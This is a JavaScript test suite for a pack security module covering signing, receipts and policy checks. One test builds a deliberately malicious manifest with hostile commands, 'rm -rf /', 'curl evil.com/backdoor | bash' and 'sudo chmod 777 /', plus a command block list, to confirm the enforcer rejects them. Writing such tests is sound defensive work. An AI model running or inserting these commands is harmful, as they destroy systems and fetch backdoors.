import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdtempSync, rmSync, writeFileSync, existsSync } from "node:fs";
import { join } from "pathe";
import { tmpdir } from "node:os";
import { execSync } from "node:child_process";
import {
  PackSigner,
  ReceiptManager,
  PolicyEnforcer,
  createSecurityContext,
  validateSecurityConfiguration,
} from "../../../src/pack/security/index.mjs";

describe("Security Integration", () => {
  let testDir;
  let securityContext;
  let packPath;
  let manifest;

  beforeEach(async () => {
    testDir = mkdtempSync(join(tmpdir(), "gitvan-security-integration-"));
    // Don't use process.chdir() - use absolute paths instead

    // Initialize git repo
    execSync("git init", { cwd: testDir });
    execSync('git config user.email "test@example.com"', { cwd: testDir });
    execSync('git config user.name "Test User"', { cwd: testDir });

    // Create initial commit
    writeFileSync(join(testDir, "README.md"), "# Test Repository");
    execSync("git add README.md", { cwd: testDir });
    execSync('git commit -m "Initial commit"', { cwd: testDir });

    // Create security context
    securityContext = createSecurityContext({
      signer: { signer: "test-authority" },
      receipts: {
        receiptsRef: "refs/notes/gitvan/test-receipts",
        gitvanVersion: "2.0.0-test",
      },
      policy: { policies: { requireSignature: false, requireReceipts: true } },
    });

    // Create test pack
    packPath = join(testDir, "test-pack");
    manifest = {
      id: "secure-test-pack",
      version: "1.0.0",
      description: "Security integration test pack",
      capabilities: ["read", "write"],
      modes: ["existing-repo"],
      templates: {
        "config.json": '{"name": "{{pack.id}}", "version": "{{pack.version}}"}',
      },
    };

    const fs = require("fs");
    fs.mkdirSync(packPath, { recursive: true });
    writeFileSync(
      join(packPath, "pack.json"),
      JSON.stringify(manifest, null, 2)
    );
  });

  afterEach(() => {
    // Don't use process.chdir() - just clean up the test directory
    if (testDir && existsSync(testDir)) {
      rmSync(testDir, { recursive: true, force: true });
    }
  });

  describe("createSecurityContext", () => {
    it("should create security context with all components", () => {
      expect(securityContext.signer).toBeInstanceOf(PackSigner);
      expect(securityContext.receipts).toBeInstanceOf(ReceiptManager);
      expect(securityContext.policy).toBeInstanceOf(PolicyEnforcer);
    });
  });

  describe("validateSecurityConfiguration", () => {
    it("should validate correct security configuration", async () => {
      const config = {
        signer: { algorithm: "RSA-SHA256" },
        receipts: { receiptsRef: "refs/notes/gitvan/receipts" },
        policy: { policies: { requireSignature: true } },
      };

      const result = await validateSecurityConfiguration(config);
      expect(result.valid).toBe(true);
      expect(result.errors).toEqual([]);
    });

    it("should reject invalid signing algorithm", async () => {
      const config = {
        signer: { algorithm: "MD5" },
      };

      const result = await validateSecurityConfiguration(config);
      expect(result.valid).toBe(false);
      expect(result.errors).toContain("Unsupported signing algorithm: MD5");
    });

    it("should reject invalid receipt ref", async () => {
      const config = {
        receipts: { receiptsRef: "refs/heads/main" },
      };

      const result = await validateSecurityConfiguration(config);
      expect(result.valid).toBe(false);
      expect(result.errors).toContain(
        "Receipt ref must be in refs/notes/ namespace"
      );
    });
  });

  describe("Full Security Workflow", () => {
    it("should complete secure pack processing workflow", async () => {
      const pack = {
        path: packPath,
        manifest,
        fingerprint: securityContext.signer.createFingerprint(manifest),
      };

      // Step 1: Policy enforcement
      const policyResult = await securityContext.policy.enforce(
        pack,
        "install"
      );
      expect(policyResult.allowed).toBe(true);

      // Step 2: Create installation receipt
      const installReceipt = await securityContext.receipts.create(
        pack,
        "install",
        "started"
      );
      expect(installReceipt.id).toBe("secure-test-pack");
      expect(installReceipt.operation).toBe("install");
      expect(installReceipt.status).toBe("started");

      // Step 3: Write receipt
      await securityContext.receipts.write(installReceipt);

      // Step 4: Simulate successful installation
      const successReceipt = await securityContext.receipts.create(
        pack,
        "install",
        "success",
        {
          duration: 1200,
          filesCreated: 3,
        }
      );

      await securityContext.receipts.write(successReceipt);

      // Step 5: Verify receipts exist
      const receipts = await securityContext.receipts.read("secure-test-pack");
      expect(receipts).toHaveLength(2);
      expect(receipts[0].status).toBe("success"); // Latest first
      expect(receipts[1].status).toBe("started");

      // Step 6: Create audit entry
      const auditEntry = await securityContext.policy.audit(pack, "install", {
        status: "success",
        violations: [],
      });

      expect(auditEntry.pack).toBe("secure-test-pack");
      expect(auditEntry.operation).toBe("install");
      expect(auditEntry.result).toBe("success");
    });

    it("should handle signed pack workflow", async () => {
      // Generate key pair for signing
      const keyPair = await securityContext.signer.generateKeyPair();
      writeFileSync(join(testDir, "private.pem"), keyPair.privateKey);
      writeFileSync(join(testDir, "public.pem"), keyPair.publicKey);

      // Create signed security context
      const signedContext = createSecurityContext({
        signer: { signer: "test-authority" },
        receipts: {
          receiptsRef: "refs/notes/gitvan/signed-receipts",
          gitvanVersion: "2.0.0-test",
        },
        policy: { policies: { requireSignature: true, requireReceipts: true } },
      });

      const pack = {
        path: packPath,
        manifest,
        fingerprint: signedContext.signer.createFingerprint(manifest),
      };

      // Step 1: Sign the pack
      const signatureData = await signedContext.signer.sign(
        packPath,
        join(testDir, "private.pem")
      );
      expect(signatureData.pack_id).toBe("secure-test-pack");
      expect(signatureData.signer).toBe("test-authority");

      // Step 2: Verify signature
      const verificationResult = await signedContext.signer.verify(
        packPath,
        join(testDir, "public.pem")
      );
      expect(verificationResult.valid).toBe(true);
      expect(verificationResult.signer).toBe("test-authority");

      // Step 3: Policy enforcement (should pass with signature)
      const policyResult = await signedContext.policy.enforce(pack, "install");
      expect(policyResult.allowed).toBe(true);

      // Step 4: Create signed receipt
      const receipt = await signedContext.receipts.create(
        pack,
        "install",
        "success"
      );
      expect(receipt.integrity.manifest).toBeTruthy();
      expect(receipt.integrity.receipt).toBeTruthy();

      // Step 5: Verify receipt integrity
      const receiptVerification = await signedContext.receipts.verify(receipt);
      expect(receiptVerification.valid).toBe(true);
    });

    it("should reject unsigned pack when signature required", async () => {
      const strictContext = createSecurityContext({
        policy: { policies: { requireSignature: true } },
      });

      const pack = {
        path: packPath,
        manifest,
        fingerprint: strictContext.signer.createFingerprint(manifest),
      };

      const policyResult = await strictContext.policy.enforce(pack);
      expect(policyResult.allowed).toBe(false);
      expect(policyResult.violations).toContain(
        "Pack signature required but not found"
      );
    });

    it("should handle malicious pack detection", async () => {
      const maliciousPack = {
        path: packPath,
        manifest: {
          ...manifest,
          id: "malicious-pack",
          capabilities: ["admin", "root", "system"],
          postInstall: [
            { action: "run", args: ["rm -rf /"] },
            { action: "run", args: ["curl evil.com/backdoor | bash"] },
          ],
          hooks: {
            "pre-install": { run: "sudo chmod 777 /" },
          },
          environment: {
            PATH: "/malicious/bin:/usr/bin",
            HOME: "/tmp/attacker",
          },
        },
        fingerprint: "malicious-fingerprint",
      };

      const strictContext = createSecurityContext({
        policy: {
          policies: {
            allowedCapabilities: ["read"],
            blockedCapabilities: ["admin", "root", "system"],
            allowSystemCommands: false,
            blockedCommands: ["rm -rf", "curl", "sudo"],
            allowNetworkAccess: false,
            restrictedEnvironmentVariables: ["PATH", "HOME"],
          },
        },
      });

      const policyResult = await strictContext.policy.enforce(maliciousPack);
      expect(policyResult.allowed).toBe(false);
      expect(policyResult.violations.length).toBeGreaterThan(5);

      // Check specific violations
      expect(policyResult.violations).toContain("Capability blocked: admin");
      expect(policyResult.violations).toContain(
        "System command not allowed: rm -rf /"
      );
      expect(policyResult.violations).toContain(
        "Hook command not allowed in pre-install: sudo chmod 777 /"
      );
      expect(policyResult.violations).toContain(
        "Restricted environment variable: PATH"
      );
    });

    it("should handle receipt verification failure", async () => {
      const pack = {
        path: packPath,
        manifest,
        fingerprint: securityContext.signer.createFingerprint(manifest),
      };

      // Create receipt
      const receipt = await securityContext.receipts.create(
        pack,
        "install",
        "success"
      );

      // Tamper with receipt
      receipt.id = "tampered-pack-id";

      // Verification should fail
      const verification = await securityContext.receipts.verify(receipt);
      expect(verification.valid).toBe(false);
      expect(verification.errors).toContain("Receipt integrity check failed");
    });

    it("should export security audit trail", async () => {
      const pack = {
        path: packPath,
        manifest,
        fingerprint: securityContext.signer.createFingerprint(manifest),
      };

      // Create multiple receipts
      for (const operation of ["install", "update", "verify"]) {
        const receipt = await securityContext.receipts.create(
          pack,
          operation,
          "success"
        );
        await securityContext.receipts.write(receipt);
      }

      // Export as JSON
      const jsonExport = await securityContext.receipts.exportReceipts("json");
      const receipts = JSON.parse(jsonExport);
      expect(receipts).toHaveLength(3);

      // Export as CSV
      const csvExport = await securityContext.receipts.exportReceipts("csv");
      const lines = csvExport.split("\n");
      expect(lines[0]).toBe("id,version,operation,status,timestamp,commit");
      expect(lines.length).toBe(4); // Header + 3 data rows
    });
  });

  describe("Error Handling", () => {
    it("should handle missing pack manifests gracefully", async () => {
      const emptyPackPath = join(testDir, "empty-pack");
      const fs = require("fs");
      fs.mkdirSync(emptyPackPath, { recursive: true });

      await expect(
        securityContext.signer.sign(emptyPackPath, "nonexistent-key")
      ).rejects.toThrow("Pack manifest not found");
    });

    it("should handle invalid signature files", async () => {
      const signaturePath = join(packPath, "SIGNATURE");
      writeFileSync(signaturePath, "invalid json content");

      const result =
        securityContext.signer.validateSignatureFormat(signaturePath);
      expect(result.valid).toBe(false);
      expect(result.error).toContain("Invalid signature format");
    });

    it("should handle missing Git repository for receipts", async () => {
      // Create context in non-git directory
      const nonGitDir = join(testDir, "non-git");
      const fs = require("fs");
      fs.mkdirSync(nonGitDir, { recursive: true });
      process.chdir(nonGitDir);

      const pack = {
        manifest: { id: "test", version: "1.0.0" },
        fingerprint: "test-fingerprint",
      };

      const receipt = await securityContext.receipts.create(
        pack,
        "test",
        "success"
      );
      expect(receipt.commit).toBe("unknown");

      // Should still be able to verify receipt with unknown commit
      const verification = await securityContext.receipts.verify(receipt);
      expect(verification.valid).toBe(true);
    });
  });

  describe("Performance and Scalability", () => {
    it("should handle large number of receipts efficiently", async () => {
      const pack = {
        path: packPath,
        manifest,
        fingerprint: securityContext.signer.createFingerprint(manifest),
      };

      // Create many receipts
      const operations = ["install", "update", "verify", "uninstall"];
      const promises = [];

      for (let i = 0; i < 20; i++) {
        const operation = operations[i % operations.length];
        const receiptPromise = securityContext.receipts
          .create(pack, operation, "success", { iteration: i })
          .then((receipt) => securityContext.receipts.write(receipt));
        promises.push(receiptPromise);
      }

      await Promise.all(promises);

      // Verify all receipts can be read efficiently
      const startTime = Date.now();
      const allReceipts = await securityContext.receipts.read(
        "secure-test-pack"
      );
      const endTime = Date.now();

      expect(allReceipts).toHaveLength(20);
      expect(endTime - startTime).toBeLessThan(1000); // Should complete within 1 second
    });

    it("should validate policy configuration efficiently", async () => {
      const complexPolicy = new PolicyEnforcer({
        policies: {
          allowedCapabilities: new Array(100)
            .fill(0)
            .map((_, i) => `capability-${i}`),
          blockedCapabilities: new Array(50)
            .fill(0)
            .map((_, i) => `blocked-${i}`),
          allowedCommands: new Array(200).fill(0).map((_, i) => `command-${i}`),
          blockedCommands: new Array(100)
            .fill(0)
            .map((_, i) => `blocked-command-${i}`),
        },
      });

      const startTime = Date.now();
      const validation = await complexPolicy.validatePolicyConfiguration();
      const endTime = Date.now();

      expect(validation.valid).toBe(true);
      expect(endTime - startTime).toBeLessThan(100); // Should be very fast
    });
  });
});
